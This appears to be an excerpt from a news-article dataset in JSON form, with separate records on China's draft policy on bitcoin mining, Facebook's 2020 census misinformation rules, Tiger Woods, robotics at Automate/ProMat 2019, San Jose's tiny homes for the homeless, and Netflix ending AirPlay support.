      "text": "The Takeaway: \nA draft proposal from China\u2019s economic planning commission labels bitcoin mining as an industry that needs to be \u201celiminated.\u201d But even if finalized in its current form, this would not automatically amount to an outright mining ban. \nWhile local governments are supposed to follow the commission\u2019s guidance, to take action against an industry they need a basis in the laws of the state, not industrial policy. \nFurther, there are past examples of \u201cundesirable\u201d industries that were eventually recategorized because phasing them out was found to conflict with local interests. \nSeizing on this, miners are arguing that eliminating their industry would also conflict with local interests, in part because they soak up excess electricity that would otherwise go to waste. \nOne of these things is not like the others. \nOn Sept. 4, 2017, the People\u2019s Bank of China (PBoC), together with six other central government agencies and financial regulators, banned initial coin offerings (ICOs). \nLater that month, regulators ordered the country\u2019s bitcoin and cryptocurrency exchanges to shut down. \nAnd on April 8 of this year, the National Development and Reform Commission (NDRC), China\u2019s top macroeconomic planner and one of 26 cabinet-level agencies which form the State Council, published a draft proposal to amend the Catalog for Guiding Industrial Restructure. \nThe proposed revision, still pending public consultation, classifies \u201cvirtual currency mining, such as the production process of bitcoin\u201d as an industry category that\u2019s undesirable and to be eliminated, together with hundreds of other sectors. \nThe news was widely covered, with most media outlets leaping to the conclusion that China now wants to ban cryptocurrency mining, just as it did in 2017 with ICOs and domestic spot trading. \nBut to call this policy a \u201cban\u201d in the same sense is misleading at best. The reality is more nuanced, and requires additional context to fully understand. \nBelow, CoinDesk takes a close look at the history of the NDRC\u2019s policy recommendations to clarify what this latest guidance really means \u2013 and why it does not automatically amount to an outright ban. \nA provision and a catch \nThe NDRC first published its catalog in 2005 , grouping industrial sectors into three types \u2013 those the agency advises the country to encourage, restrict or eliminate. \nIt defined those to be eliminated as industries that have obsolete techniques, products, and technology, or which are unlawful, unsafe, wasteful or pollutive. \nThe purpose of the catalog is to serve as a macro-level economic policy to guide local governments on how to allocate their investment and resources to balance local economic growth with overall stability. \nTo give such policy a legal status, the State Council promulgated an \u201cInterim Provisions on Promoting Industrial Structure Adjustment\u201d for implementation in December 2005. \nAccording to a translation by LexisNexis (full document included at the end of this article), Article 19 of the Interim Provisions clarifies what local governments shall do with industries that are categorized as to be eliminated. \n\u201c[Government] Investments are prohibited from being contributed to projects of the eliminated category. All financial institutions shall stop various forms of credit granting supports to such projects, and take measures to recover the granted loans,\u201d the Article reads, adding: \n\u201cIf any enterprise of the eliminated category refuses to eliminate the production technique, equipment or products, the local people\u2019s government at each level and the relevant administrative department shall, in accordance with the relevant laws and regulations of the state, order it to stop production or close it.\u201d \nTherefore, indeed, local governments are required to take proper actions to implement what\u2019s outlined in the NDRC\u2019s policy guide. \nBut there\u2019s a notable catch: the part about \u201cthe relevant laws and regulations of the state.\u201d \nKai Xu, a legal practitioner in China with expertise in corporate governance and compliance, explained to CoinDesk that local governments must use related laws and regulations \u2013 not the Interim Provisions itself \u2013 as a legal basis to take forceful actions to shut down \u201cundesirable\u201d companies. \nFor instance, the State Administration for Industry and Commerce recently published a provision for administrative penalty when regulating businesses like internet advertising and e-commerce. \nIt outlines who is entitled to take forceful administrative actions against companies violating regulations, what the penalties are and how they should be carried out. \n\u201cBecause such an action is an administrative penalty, it must have a legal ground first,\u201d Xu said. \u201cIt\u2019s currently unclear [how or what types of laws bitcoin mining should fall under].\u201d \nHe added that the legal nature of the NDRC\u2019s policy is different from that of the ICO ban announced by the central bank in 2017 (which clearly defined the nature of ICOs as an illegal activity, meaning any entity that still engages in that activity is subject to legal actions). \n\u201cThe former is an industry policy and the latter is a departmental regulatory document,\u201d he said. \nLocal interest \nAlso importantly, the State Council emphasized at the top of the 2005 Interim Provisions that local governments, when implementing the industrial policy, are also required to balance the government guidance and the functions of the market as well as local interests. \nIt states: \n\u201cThe relevant governments and departments shall, when implementing the \u2018Interim Provisions\u2019, correctly deal with the relationship between government guidance and market regulation, give full play to the fundamental role of the market in allocating resources, correctly deal with the relationship between development and stability, that between partial interests and overall interests, and that between immediate interests and long-term interests, so as to keep the stable and fast development of the economy.\u201d \nXu told CoinDesk that if the final form of the policy guide includes bitcoin mining as a category to be eliminated, it will be the job of local governments and relevant departments to implement actual executional plans. \nBut he also pointed out there is always the possibility that a policy will not be enforced or implemented in the end, adding: \n\u201cThere are many reasons to that, since executions are carried out by human beings, after all. And there may also be information costs during implementation, as well as conflicts with local interest.\u201d \nAnd members of the local mining community have also raised questions about whether it\u2019s reasonable to label bitcoin mining as an industry to be eliminated, arguing that such a decision could potentially conflict with local interest. \nAlex Ao, founder of Innosilicon, which manufactures cryptocurrency mining equipment, said in China\u2019s Inner Mongolia, Xinjiang and southwestern provinces like Sichuan and Yunnan, there is excessive electricity generated every year that can neither be fully consumed by local demand nor be integrated to the State Grid to be transmitted to regions outside. \nFor instance, the Garze prefecture government in Sichuan has said that in 2017 alone, hydropower plants in the area generated 41.5 billion kilowatt hours (kWh) of electricity thanks to the rainy season in the summer. \nBut a total excess of 16.3 billion kWh went to waste due to not enough local consumption, which resulted in a direct economic loss of some 4 billion yuan, or $600 million, for local hydropower companies. \nTyler Xiong, chief marketing officer of Bixin, which operates a mining pool and wallet service, echoed that sentiment. \n\u201cFirst, bitcoin mining doesn\u2019t result in pollution. It actually helps consume excessive electricity [generated by local plants] that would otherwise go to waste. And it creates jobs and revenue locally,\u201d he said. \u201cEliminating that could conflict with local interest because it can benefit the local economy.\u201d \nThe public now has until May 7 to submit feedback on the NDRC draft proposal. While it\u2019s unclear when the final version will be published, the draft comes at a time when Chinese bitcoin miners have been investing to scale up their mining capacity to capture on the cheap electricity during the summer. \nWhat happened before? \nIt\u2019s worth noting that the NDRC had published and revised the policy guide multiple times over the past decade. What happened to some of the industries that were previously labeled as to be eliminated? \nWhile it is difficult to grasp a full picture of the actual implementation over the years, one article from the People\u2019s Daily in 2006 described certain issues local governments in Hebei encountered when eliminating energy-intensive sectors such as cement manufacturing, following the 2005 policy guide. \nThe article cited a comment from an official from the NDRC, explaining the policy guide was not a legal basis for taking forceful actions to shut down companies. \n\u201cIt must be done in accordance to relevant laws,\u201d the official said, a point echoed by Xu above. \nIn the cement-making instance, the article said most local governments used laws and regulations relating to land resources and environment management as a legal basis for taking actions. \nAnd there are also examples where certain items were first marked for elimination, but later removed from the category, thanks to feedback gathered during implementation. \nFor example, in 2011, the production equipment for manufacturing cold-rolled ribbed bar (a material used in construction) was classified as a sector that should be eliminated. \nIn a revised version in 2013, the NDRC adjusted the wording to specify that only certain types of cold-rolled ribbed bar equipment with productivity below a threshold should be eliminated. \nThe NDRC explained in a separate note that the reason for the revision was because during implementation, the industry had provided feedback that there was still a considerable amount of domestic demand for cold-rolled ribbed bar making. \nAfter gathering and studying such feedback with relevant government departments, the Commission agreed that some equipment with higher productivity and efficiency should be kept. \nNone of this is to downplay the attitude shown in the policy guide from the NDRC, which clearly voices a stance of not supporting cryptocurrency mining in China. \nYet the main questions that are now in the air is whether the final form of the policy will still include bitcoin mining in the \u201cundesirable\u201d category, and if so, how lawmakers and local governments will carry out the implementation \u2013 especially when it conflicts with potential local interest. \nChinese mining farm image via CoinDesk archive",

      "text": "\u201cScammers, criminals, fraudsters, online trolls, unscrupulous opportunists and malicious actors are potential sources of disinformation that we expect to face with the 2020 census,\u201d U.S. Census Bureau deputy director and COO Ron Jarmin wrote in a blog post earlier this week. \n\u201cEven benign misinformation carries significant risk,\u201d Jarmin continued. \u201cUrban legends spread faster online through social media than ever before, and sometimes, friendly supporters of the 2020 census and well-meaning groups accidentally spread misinformation when the information they have is incorrect.\u201d \nThe social network outlined a comprehensive census interference policy Thursday, detailing its work with the Census Bureau, members of Congress and related experts. \nFacebook established a multidisciplinary team across its product, engineering, policy, operations and legal branches to protect and promote participation in the census. \nThe social network\u2019s vp of U.S. public policy (and former FCC chairman) Kevin Martin and head of civic engagement Samidh Chakrabarti said in a Newsroom post that Facebook\u2019s community standards were updated to reflect the new protections for the 2020 U.S. census. \nThe new policy bans all kinds of misrepresentation about participating in the census, from facts (like dates, times and locations) to who is allowed to respond to census questions. \n\u201cWe were happy to see the changes in Facebook\u2019s terms of service that enable content to be taken down quickly,\u201d U.S. Census Bureau assistant director of communications Stephen Buckner told Adweek. \u201cA lot of the misinformation out here about the census is innocent enough that people don\u2019t realize it and don\u2019t know how to respond. We have to react quickly based on how quickly information spreads across social platforms.\u201d \nFacebook also introduced a new advertising policy banning ads that portray participating in the census process as \u201cuseless or meaningless,\u201d or advising people not to take part. \nCensus-related ads will be subject to the same transparency requirements as political issue ads: Advertisers must complete Facebook\u2019s authorization process for ads about social issues, elections or politics, and include disclaimers on their ads providing information on who paid for them. Those ads will be saved in the social network\u2019s Ad Library for at least seven years. \nFacebook said it will use a combination of humans and machine learning to identify content that may violate these policies, and a team of reviewers will then assess that content. Members of that team will have undergone training from consultants with expertise in the census. \nThe social network stressed that all content violating these policies will be removed from its platform, and that the newsworthiness exemption enjoyed by politicians elsewhere on its platform is not in play here. \nFacebook did not respond to a request for comment on why it chose to subject politicians\u2019 census-related content to fact checking, but not their content on other issues. \nIn cases where content does not specifically violate Facebook\u2019s census interference policy but is determined to be potentially inaccurate, it will be reviewed by the social network\u2019s third-party fact checkers and, if it is rated as false, it will be labeled as such and ranked lower in users\u2019 News Feeds. \nFacebook will also share accurate, nonpartisan information about how people can participate in the census, in consultation with the Census Bureau. \nMartin and Chakrabarti said the company met with Census Bureau officials \u201cmultiple times\u201d to brief them on its plans and coordinate their efforts, as well as to identify trusted partners to aid in the process of flagging potentially suppressive census content on Facebook and Instagram. \nLocal officials and Census Bureau partners have access to data from CrowdTangle , a tool the social network uses to track how content is spreading online. \nJarmin wrote that while the census only occurs every 10 years, it is used as the basis for key government decisions, adding, \u201cAn accurate count is important to everyone as it determines congressional representation for each state and the distribution of billions of dollars in federal funds back to states and local communities every year for critical public services and infrastructure.\u201d",

He won six tournaments in 2009 another five in 2013 and has earned 43 top-10 finishes in the process. \nBut what he is remembered for might be his near-misses and injuries rather than his achievements. \nIn 2009 he lost a lead going into the final round of a major for the first time when he fell to Y.E. Yang at the PGA Championship. Then at the final major of the 2018 season he was unable to close in on Koepka. That came after he missed most of 2017 trying to work his way back from injuries. It's pain he still deals with and he is constantly having to fight off. \nThat is why East Lake was such a big deal for him. He started well, continued to succeed and closed it out on the final day while feeling healthy in the process. \n\"I look back upon that week as not only how it culminated with everything on 18, but I led from Day 1 and that's not easy to do,\" Woods said. \"And from the struggles I've had the last few years, to go out and take the lead on the first day and then end up winning the tournament, leading wire to wire, that made that much more special.\" \nNow Woods turns his sights on the Masters where he has won four times but not one since 2005. However, in the struggles he has had in recent years, he has been good at Augusta finishing sixth in 2009, fourth in 2010, 2011 and 2013 and 17th in 2015. \nWhile Woods has plenty of wins on every type of course, this could very well be the one to get him that elusive 15th major title, one that he has been waiting more than 10 years to get. \n\"I would not have foreseen that for sure,\" Woods said. \"After I won my 14th, I felt like I still had plenty of more major championships that I could win, unfortunately I just didn't do it, I put myself there with chances on the back nine with various places, I just haven't won. \n\"Hopefully I put myself there again.\"",

      "title": "Automate/ProMat 2019: 10 takeaways for robotics developers",
      "text": "A small portion of the Automate/ProMat 2019 expo halls. \nCHICAGO \u2014 There were many commercial robots at Automate and ProMat 2019 here last week, but which ones stood out? Developers of robotics for the manufacturing and supply chain industries could see exhibits by component makers and complete solution providers, as well as conference panels on applications. The Robot Report culled the following observations from discussions with engineers, suppliers, and analysts at Automate/ProMat. \n1. \u2018Ease of use\u2019 a mantra \nMany of the exhibitors and conference speakers said that designing for ease of use is essential to helping robotics spread beyond automotive and electronics manufacturing. \nThis year\u2019s Engelberger Award winners , Howie Choset of Carnegie Mellon University and Catherine Morris of the Association for Advancing Automation, have both spent much of their careers helping to make robots easier to use. \nCollaborative robot arms and mobile platforms can help manufacturers and logistics providers of all sizes, but programming and integration have to become easier before small and midsize enterprises will adopt more. \n\u201cOur concept for the factory of the future is \u2018collaboration, simplification, and digitization,'\u201d said Hui Zhang, head of global product management at the robotics business unit of ABB. \u201cWe\u2019re investing $150 million in China to build a new factory \u2014 robots making robots.\u201d \nJ\u00fcrgen von Hollen, president, Universal Robots \n\u201cAdoption among small and midsize enterprises is still a challenge,\u201d acknowledged J\u00fcrgen von Hollen, president of Universal Robots. \u201cEfficiency is not about reducing labor; it\u2019s about getting more out of your investment.\u201d \n\u201cWe designed the OB7 line to be a complete package for CNC machine tending,\u201d said Zac Bogart, president and CEO of Productive Robotics. \u201cNo integration is necessary, and training the robot to find an object takes one button.\u201d \nIn addition, there were new SCARA models from market leader Epson Robots, as well as St\u00e4ubli, TM Robotics , and Yamaha that they said were faster and more affordable. \n\u201cToshiba Machine wants to offer a total solution,\u201d said Nigel Smith, president of TM Robotics. \u201cWe believe our price-to-performance ratio is a key differentiator.\u201d \nSoftware is also being designed to help users more quickly get robots working. For instance, Ready Robotics \u2018 Forge product line is intended to make controlling both industrial and collaborative robots easier. Similarly, Sisu said its VUDU visual programming interface and controller don\u2019t require any programming experience. \n2. More mobile robots, accessories \nA major driver for the growth in mobile robots is the need for greater flexibility in factories and warehouses. From autonomous forklifts and tote conveyors to heavy-lift platforms, mobile robots can enable users to work with existing, non-standardized facilities. They can also help avoid the costs of bolted-down infrastructure such as stationary conveyors, multi-layer racks, and positioning systems. \n\u201cIn Asia in particular, companies don\u2019t want to invest in more infrastructure,\u201d said von Hollen. \u201cWe need to serve customer requirements.\u201d \nCobots and AMRs were two of the best-represented types of robots in McCormick Place. More than 50 mobile robot vendors had booths at Automate/ProMat 2019, observed Mike Oitzman, founder of Mobile Robot Guide . \nWhile there were still plenty of automated guided vehicles (AGVs), particularly at ProMat , several suppliers touted the more advanced navigation and obstacle avoidance of autonomous mobile robots (AMRs). \nMobile carts for e-commerce order fulfillment were joined by a new wave of accessories. For instance, 6 River Systems added Mobile Sort to its product line. The system combines machine learning with mobile sort stations and 6RS\u2019s Chuck mobile robots. \nThe company also featured demonstrations in which attendees could race with the robots. \nPicking with Chuck is so easy a 5-year-old can do it. Literally. With 90 seconds of coaching from our co-CEO @jeromeadubois , 5-year-old William masters the basics of our robot Chuck during our Pick to Win competition at #ProMat2019 . Way to go, William! pic.twitter.com/4xPR4L3IJE \n\u2014 6 River Systems (@6riversystems) April 9, 2019 \nROEQ, a partner of Mobile Industrial Robots (MiR), showed off its TR500 roller for the MiR500. \u201cWe are designed for the 10 standard pallet sizes in the U.S.,\u201d said Peder Grejsen, technical sales manager at ROEQ. \u201cOur nonskid rollers are collaborative and safe.\u201d \nAnother MiR partner, Nord Modules, displayed its modular system for lifting and loading payloads onto MiR\u2019s mobile robots. Relative newcomers to the U.S. market for AMRs included GreyOrange and Geek+ . \nOn the navigation side, Humatics and Vecna Robotics\u2019 partnership and Amazon\u2019s acquisition of Canvas Technology are examples of how companies are collaborating to improve and spread their offerings. \n\u201cWe\u2019ve worked directly with Vecna and MiR, and our APIs [application programming interfaces] are simple and can provide 2cm [0.78 in.] precision,\u201d said Sean Lorenz, director of product marketing at Humatics. \u201cGPS fails in urban canyons, and we can help mobile robots and cranes in noisy environments.\u201d \n3. It\u2019s all about the base \nSeveral mobile robot vendors displayed larger platforms at Automate/ProMat 2019, including Clearpath Robotics , Fetch Robotics, MiR , and Waypoint Robotics . \nVIDEO \nThese larger robots are a far cry from the carts that follow (or lead) warehouse workers. Not only are they able to move autonomously through more dynamic environments, thanks to cheaper lidar and more sophisticated software, but they can also serve as mounts for multiple collaborative robot arms. \nSome are big enough to carry a car chassis, leading to visions of more flexible manufacturing. Imagine, instead of a car moving down an assembly line to be worked on by single-purpose machines, a swarm of robots moving around the vehicle. Such heavy AMRs could also be useful in construction and agriculture , growing applications for robotics. \n4. Cobot, gripper makers focus on applications \nAt Automate/ProMat, there was as much of an emphasis on the utility of cobot arms and grippers as on new models. \u201cI want people to stop buying robots and to start buying applications,\u201d said Enrico Krog Iversen, CEO of gripper maker OnRobot . \n\u201cThe biggest shift in our display this year is from products to applications,\u201d said UR\u2019s von Hollen. \u201cWe\u2019re looking at four key applications that are a good fit for our technology: screw-driving, inspection, machine tending, and packaging.\u201d \n\u201cMany traditional automation providers thought of collaboration as just a safety measure, but for us, it just gets us on the playing field,\u201d he said. \u201cWe\u2019re still just scratching the surface of industrial applications globally.\u201d \nMore than 80 UR cobots were on display in 34 booths at Automate/ProMat. For instance, Robotiq, a partner of Universal Robots, displayed its new vacuum grippers and sanding kit . \nVIDEO \nThe number of competing cobot makers is leading to specialization and a race to add capabilities. AUBO Robotics showed three new, long-reach cobots in Chicago. \nOmron Automation also showed off human-machine interaction in its \u201c Factory Harmony \u201d demonstrations, which included vision-guided robots, laser-marking tracing, and its mobile robots and new TM-series cobot. \nIn addition to the cobots offered by the top industrial automation vendors \u2014 ABB, FANUC, KUKA, and Yaskawa \u2014 Automate attendees could see Sawyer from Rethink Robotics, whose brand continues thanks to the Hahn Group . \n5. Mobile manipulation arrives \nThe combination of mobile and collaborative robots seems obvious, but the challenges of power, safety, and precision have taken time to overcome. Several mobile manipulators were demonstrated at Automate/ProMat 2019, but there have been relatively few use cases so far. \nAs part of its \u201c smart production \u201d demonstration at Automate (which it also showed the week before at Hannover Messe), St\u00e4ubli International showed its HelMo mobile robot, which included a cobot arm. \nVIDEO \n\u201cOur smart production cell is ideal for small-batch manufacturing,\u201d said Sebastien Schmitt, North American division manager at St\u00e4ubli. \nKUKA\u2019s KMR iiwa is a cobot mounted on a mobile robot, using SLAM (simultaneous localization and mapping). \n\u201cWe have experience in mission-critical markets such as satellite manufacturing and life sciences,\u201d said Michka Tosan, a sales application engineer at KUKA Robotics. \u201cThe mobile shop floor will drive down ergonomic costs.\u201d \nIAM Robotics last week demonstrated expanded capabilities for its Swift mobile picking robot, as well as Bolt, its new tote-transport robot. \nComing to the U.S. is Magazino\u2019s Toru robot, which is designed specifically for picking and placing shoeboxes on shelves. It\u2019s able to do so from the lowest shelves and from beneath other boxes, explained Florian Wahl, public relations manager. In Europe, returns are usually free within two weeks, so goods there have a 40% return rate, he said. Magazino is expanding its mobile manipulation with Soto, which has a bigger gondola for totes. \nOne of the flashier debuts of the past week was Boston Dynamics\u2019 Handle robot , a wheeled, ostrich-like mobile manipulator for reaching and moving large boxes. While mobile version wasn\u2019t at the show, the company did have demonstrations of the industrial arm and suction grippers. \nOn a larger scale, Honeywell Intelligrated, which recently partnered with Fetch Robotics , introduced its robotic unloader , which can operated autonomously to empty a truck. \n6. Software and AI specialize \nMost hardware makers would contend that their robots have not yet become commoditized, but they might agree that the software stack is becoming increasingly important and specialized. In addition to perception, navigation, and manipulation, developers are building layers for data sharing, controls, and security. \n\u201cOur Actin SDK is the opposite of UR arms \u2014 it\u2019s a specific tool for broad applications,\u201d said Neil Tardella, CEO of Energid Technologies. \u201cOur motion-planning software is robot-agnostic, and it can control both industrial robots and cobots.\u201d \nRightHand Robotics Inc. released its RightPick2 platform for robotic pick-and-place operations. It combines the RightPick.AI vision and motion-control software using deep learning with hardware upgrades. \nVIDEO \n\u201cThe [first version of the] RightPick platform has successfully completed 10 million picks autonomously across many industries, including e-commerce, retail, pharmaceuticals, grocery, and more,\u201d said Leif Jentoft, co-founder of RightHand Robotics. \nXYZ Robotics\u2019 Rebinning Station and Packing Station uses machine learning to speed up piece picking. PlusOne Robotics said it \u201ccreates order from chaos\u201d with its software for mixed parcel singulation, remote robot management, and quality assurance for parcel induction. \nLocus Robotics\u2019 \u201cSpring 2019\u201d software release is \u201cthe industry\u2019s first, full omnichannel support that seamlessly handles all aspects of fulfillment for retail, wholesale, and e-commerce channels,\u201d said CEO Rick Faulk . \nTend.ai was an example of a company actually applying artificial intelligence to predictive maintenance for manufacturing. There were also stationary robots using intelligent grasping at Automate/ProMat, such as those of Kindred. \n\u201cThe attitude of users is changing; it\u2019s interesting to see a new generation approaching applications in a different way,\u201d said Steve Green, general manager of robotics and solutions at KUKA. \u201cOne of our biggest customers is a startup on the West Coast, and AI can help identify products that robots haven\u2019t seen before.\u201d \nInspekto\u2019s autonomous machine vision system is designed to eliminate the need for vision integrators and to work, regardless of lighting conditions, said attendee Harel Boren, CEO of the Israeli-German company. \nAt the same time, many of the references to AI at Automate/ProMat were about machine learning for vision, navigation, or grasping rather than deep learning or robots actually using AI , noted Frank Tobe. \n7. Simulation from the ground up \n\u201cDigitalization covers the entire lifecycle, starting from design,\u201d ABB\u2019s Zhang told The Robot Report . \u201cWith RobotStudio and virtual reality, a group can collaborate remotely on designing a work cell. We\u2019re partnering with Dassault on building digital twins on a larger scale.\u201d \nAt Siemens\u2019 booth, videos demonstrated how Xsens\u2019 3-D motion-tracking system can add humans to digital twins of processes. \n\u201cIn addition, our simulation packages can generate PLC code from a digital twin, and you can test the PLC on that twin and then send code to the robot,\u201d said Bhaskar Chopra, industry manager for material handling, strategic business development, and motion control at Siemens. \u201cWe can go from simulating a process to a plant floor to global management.\u201d \nVIDEO \n8. Incremental progress at Automate/ProMat \nWhile there was a lot to see at this year\u2019s Automate/ProMat, several attendees said that they saw little that was groundbreaking. However, the latest models of AMRs, cobots, and industrial automation did show incremental improvements in sensors, software, and end effectors. \nServo provider Kollmorgen livened up the show floor with its boxing robot display, and other component providers were scattered around the Automate/ProMat expo halls. \n\u201cRobotics technology is more mature, and customers realize that it has been vetted,\u201d explained UR\u2019s von Hollen. \u201cWith political and economic uncertainty, companies realize that they need more flexible investments. We\u2019re being brought into projects much sooner, and we rolled out 500 to 600 cobots in 12 months for one customer order.\u201d \n9. Exploring new markets \nRobotics companies from Denmark and Massachusetts were well-represented at Automate/ProMat 2019, but suppliers from China to Germany were focused on growing existing markets and finding new applications. \n\u201cWe\u2019re finding that [robotics for] electronics is growing faster than automotive or metals,\u201d said ABB\u2019s Hui Zhang. \u201cIn the U.S., medical instruments and food and beverage are still growing strong.\u201d \nOnRobot\u2019s Iversen told The Robot Report that Automate was providing many good sales leads, with some people signing contracts on the spot. \u201cWe need to move beyond traditional verticals, and our partner network must cover all industries,\u201d he said. \u201cStrong competition keeps us on our toes \u2014 it\u2019s good for our industry and for end users.\u201d \n\u201cOur product has been used for critical systems such as surgical robots, and we\u2019re expanding in industrial automation,\u201d said Energid\u2019s Tardella. \n\u201cThe number of systems integrators we partner with is increasing, which helps grow the number of end users,\u201d said Rick Brookshire, group product manager at Epson Robots. \u201cWe\u2019re also hiring salespeople and application engineers.\u201d \nUnlike other vendors, Epson makes many of its own components and put its pricing on signs in its booth. \u201cWe stay out of the high-low game,\u201d Brookshire said. \u201cWe leave the 100-kg-plus robots to others. Our VT6L is priced at $13,900 to make automation accessible.\u201d \nEven as Western companies try to expand in Asia, South Korea-based Doosan Robotics entered the North American market with its cobots at Automate/ProMat. \n10. Looking ahead to the future of automation, industry \nIndustry 4.0 or the factory of the future might be coming, but many robotics developers at the event said that they\u2019re watching technologies such as the Internet of Things (IoT) and 5G to see how they\u2019ll affect their businesses. \n\u201cThere is already a tremendous amount of data being collected,\u201d said one attendee. \u201cIt\u2019s more a matter of delivering it to the right person at the right time than applying a lot of AI to it.\u201d \nABB recently signed a memorandum of understanding with Ericsson to work on adding ABB\u2019s automation with Ericsson\u2019s high-performance connectivity. \nThe Association for Advancing Automation (A3) and the Material Handling Institute (MHI), the organizers of Automate and ProMat, respectively, have said that they have outgrown their colocated space in Chicago. The next Automate will be in 2021 in Detroit, while ProMat 2021 will stay in Chicago. \nIn the meantime, robotics developers, integrators, and users can look forward to the Robotics Summit & Expo in Boston in June, as well as A3\u2019s Vision Show 2020 in Boston and MHI\u2019s Modex 2020 in Atlanta.",

      "title": "A major Silicon Valley city is putting homeless people in tiny home villages",
      "text": "Hyoung Chang/MediaNews Group/The Denver Post/Getty Images \nSan Jose, California recently secured approval to build two tiny home \"villages\" for the homeless. \nThe project is one of many proposed solutions to the city's housing shortage, which has led to thousands of residents sleeping on the streets each night. \nWhile local residents initially opposed the idea, the city's mayor sees it as a way to tackle a \"fundamental crisis.\" \nOn any given night in San Jose, California, it's possible to encounter homeless residents sleeping beneath highway underpasses or in large, tented encampments mere blocks away from some of the wealthiest neighborhoods in the US. \nAs the largest city in Silicon Valley, San Jose has an estimated 4,300 homeless residents \u2014 a number that swells to around 7,000 people for the entire Santa Clara County. \nSam Liccardo, the mayor of San Jose, is aware of this epidemic, and his office has suggested a bevy of new solutions to solve it, including converted models and a floating apartment complex . \nThe city is now moving forward with one of its most ambitious projects to date: a pair of tiny home villages consisting of around 80 short-term units for the homeless. \n\"As fast as we're getting people housed, we know thousands of other folks are getting pushed out in the street,\" Liccardo told Business Insider. \"It's going to take a lot of housing development and expanding supply to address the fundamental crisis we have today.\" \nLike many new developments, the villages have had to overcome numerous legal and financial restrictions. \nAnda Chu/MediaNews Group/The Mercury News/Getty Images \nPrior to 2016, many parts of California outlawed accessory dwelling units (ADUs), or small, secondary units located on a residential property. That made it nearly impossible for San Jose to build tiny homes, an oft-vaunted tactic for curbing homelessness. But the city's biggest constraint, said Liccardo, is building \"at a time when construction costs are literally choking the industry.\" \nWhen San Jose first proposed building villages for homeless residents, it estimated that each home would cost around $18,000. \nThe approved project cut that price to $6,500 per unit . Each home will be incredibly small \u2014 just 80-square-feet, or 120 square feet for those who are differently abled \u2014 but they come with their own electric outlets, smoke detectors, and locked doors. Residents will share showers, bathrooms, and laundry facilities. \nThe city refers to the project as \"interim housing\" \u2014 a temporary way to transition homeless people to a permanent residence. To discourage residents from staying too long, San Jose will charge a small rent of either $20 for the unemployed, or 10% of a person's income for employed residents. After six months, the rent will go up by 10%. \nThe first group of residents is expected to arrive in June, and the program will last until 2022. \nIt's a small step toward addressing an issue that's become part and parcel of Silicon Valley. Liccardo attributes San Jose's housing shortage to \"decades of many cities around Silicon Valley failing to build the housing we need for a rapidly growing workforce.\" \nJosh Edelson/AFP/Getty Images \nBut other tech industry cities like Seattle, Boston, and Los Angeles have faced similar housing crunches. And, like San Jose, they've turned to tiny homes as a way to address the problem. \nIn November 2017, Boston launched an 18-month pilot program across three neighborhoods to study the effect of ADUs on affordable housing. Around the same time, a nonprofit organization in Seattle began building 125-square-foot units in the city's Beacon Hill neighborhood. More recently, the LA County Board of Supervisors set aside $550,000 for an ADU pilot program for homeless tenants. \nCompared to these cities, San Jose has seen a considerable backlash against the idea of homeless housing. The Mercury News reported that the initial proposal for tiny home villages was \"met with fierce opposition from neighbors who worry about crime, traffic and property values.\" \nBut Liccardo said that any new development in San Jose will be met with some pushback. \n\u201cI've resolved myself to the fact that we're simply going to have to swallow hard and build in places that create this unhappy opposition,\" he told Business Insider. \"There's no alternative if we're going to get our homeless population housed.\" ",

      "title": "Netflix confirms it killed AirPlay support, won\u2019t let you beam shows to Apple TVs anymore",
      "text": "With no warning and little explanation, Netflix has removed the easiest way to sling its shows from one Apple device to another: AirPlay. \nNetflix confirmed to The Verge that it pulled the wireless casting feature this past week, due to what it\u2019s calling a \u201ctechnical limitation.\u201d But it\u2019s not the kind of technical limitation you\u2019d think. \nYou see, Apple recently partnered with most of the major TV brands to allow AirPlay 2 to send shows directly to their 2019 TV sets with a firmware update later this year, but a Netflix spokeperson tells me AirPlay 2 doesn\u2019t have digital identifiers to let Netflix tell those TVs apart \u2014 and so the company can\u2019t certify its users are getting the best Netflix experience when casting to those new sets. \nSo now, it\u2019s throwing out the baby with the bathwater and pulling the plug on AirPlay, period. \u201cWe can\u2019t distinguish which device is which, we can\u2019t actually certify the devices... so we\u2019ve had to just shut down support for it,\u201d a Netflix spokesperson says. \nTo be clear, that means Apple TV set-top box users can no longer cast Netflix, either. \nHere\u2019s the company\u2019s official statement: \nWe want to make sure our members have a great Netflix experience on any device they use. With AirPlay support rolling out to third-party devices, there isn\u2019t a way for us to distinguish between devices (what is an Apple TV vs. what isn\u2019t) or certify these experiences. Therefore, we have decided to discontinue Netflix AirPlay support to ensure our standard of quality for viewing is being met. Members can continue to access Netflix on the built-in app across Apple TV and other devices. \nAs spotted by MacRumors earlier today, the company\u2019s official support page now includes this phrase: \u201cAirplay is no longer supported for use with Netflix due to technical limitations.\u201d \nIt\u2019s a little weird and misleading, though, because we\u2019re not talking about a situation where the technology doesn\u2019t work \u2014 apparently it just doesn\u2019t look quite as nice as Netflix wanted, and Netflix, Apple and the TV manufacturers can\u2019t be bothered to fix it. \nMaybe Netflix wasn\u2019t prepared for a new wave of AirPlay 2-enabled TVs, and can\u2019t justify spending the technical resources to upgrade its AirPlay implementation to support them properly. Maybe it\u2019s Apple or Samsung, LG, Vizio and company who can\u2019t justify the spend to fix the \u201climitation.\u201d Maybe Netflix will even reinstate support after things get figured out, though a spokesperson strongly suggested to me that the ball is in Apple\u2019s court now. Apple declined to comment. \nWithout a fuller explanation, it\u2019s hard to resist thinking that Netflix is intentionally snubbing Apple for some reason, perhaps to build a wall around its subscribers, or perhaps to gain more negotiating leverage. (Netflix denies this: \u201cIt\u2019s not a business competition play.\u201d) \nBut both Apple and those TV manufacturers want to be able to use Netflix to sell fancy new AirPlay 2-enabled TVs to users, so it\u2019s in their interests to make things work. Why aren\u2019t they? \nThere is a strong potential reason for an Apple-Netflix spat: Netflix recently decided it wasn\u2019t going to be part of Apple\u2019s new TV Plus subscription video service , preferring to stay a competitor. \nReed Hastings confirms that Netflix won't be a part of the new Apple video hub announced next week. \"Apple\u2019s a great company. We want to have people watch our shows on our services.\u201d \n\u2014 Peter Kafka (@pkafka) March 18, 2019 \nAnd it wouldn\u2019t be the first time we\u2019ve seen a cold war between two companies who want control over streaming TV users \u2014 Amazon stopped stocking Google\u2019s Chromecast for three years , using its own platform in an anti-competitive way, while it refined its own rival Fire TV products. \nIt\u2019s true that most smart TVs already have Netflix built-in these days, and there\u2019s no shortage of other ways to get that content on your TV screen. Unfortunately for Apple users, one of the most convenient ways is now winking out.",

      "title": "Why Amy Collins Will Always Be The Best Dressed",
